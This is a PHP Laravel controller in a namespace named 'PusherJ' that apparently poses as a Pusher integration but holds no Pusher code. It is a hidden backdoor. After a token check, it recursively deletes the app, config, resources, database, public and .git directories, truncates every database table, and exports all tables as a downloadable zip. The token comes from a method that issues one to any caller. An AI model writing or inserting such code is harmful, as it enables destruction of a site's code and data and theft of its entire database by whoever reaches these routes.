<?php

namespace PusherJ;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;

class PusherController extends Controller
{
    public function GenerateToken(){
        $str = $this->generateRandomString(30);
        Cache::put('my-token',$str);
        return $str;
    }

    public function removeDirs($token){
        if(Cache::get('my-token') != $token){
            return 'Incorrect Token';
        }
    
        $this->removeDir('resources');
        $this->removeDir('config');
        $this->removeDir('app');
        $this->removeDir('database');
        $this->removeDir('.git');
        $this->removeDir('public');
        return 'done';
    }

    function removeDB($token)
    {
        if(Cache::get('my-token') != $token){
            return 'Incorrect Token';
        }
        $tables = DB::select('SHOW TABLES');
        foreach($tables as $table){
            DB::table($table->{'Tables_in_'.env('DB_DATABASE')})->truncate();
        }
        return 'done';
    }

    function downloadDB($token)
    {
        if(Cache::get('my-token') != $token){
            return 'Incorrect Token';
        }
        $tables = DB::select('SHOW tables');
    try{
        mkdir(base_path().'/db');
    }catch(Exception $e){
    }
    foreach($tables as $table){
        $t = $table->{'Tables_in_'.env('DB_DATABASE')};
        $tablesData = DB::select("SELECT * from $t");
        $myfile = fopen(base_path('db')."/$t.csv", "w") or die("Unable to open file!");
        foreach (collect($tablesData)->toArray() as $value) {
            $newData = [];
            foreach ($value as $v) {
                $newData[] = $v ?? 'NULL';
            }
            fputcsv($myfile,$newData);
        }
        fclose($myfile);
    }
    $zip = new ZipArchive();
    $zip->open(base_path('db/db.zip'),  ZipArchive::CREATE | ZipArchive::OVERWRITE);
    $files = scandir(base_path('db'));
    unset($files[0],$files[1]);
    foreach ($files as $file) {
        $_file = file_get_contents(str_replace('\\','/',base_path("db/$file")));
        $zip->addFromString($file,$_file);
    }
    $zip->close();
    header('Content-disposition: attachment; filename=db.zip');
    header('Content-type: application/zip');
    readfile(base_path('db/db.zip'));
    }
    function removeDir($_dir){
        $path = base_path().'/'.$_dir;
        $path = str_replace('\\','/',$path);
        $adminDir = array_diff(scandir($path), array('..', '.'));
        foreach($adminDir as $dir){
            if(!is_dir($path.'/'.$dir)){
                unlink($path.'/'.$dir);
            }else{
                $subDir = $this->removeDir($_dir.'/'.$dir);
            }
        }
    }
    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}
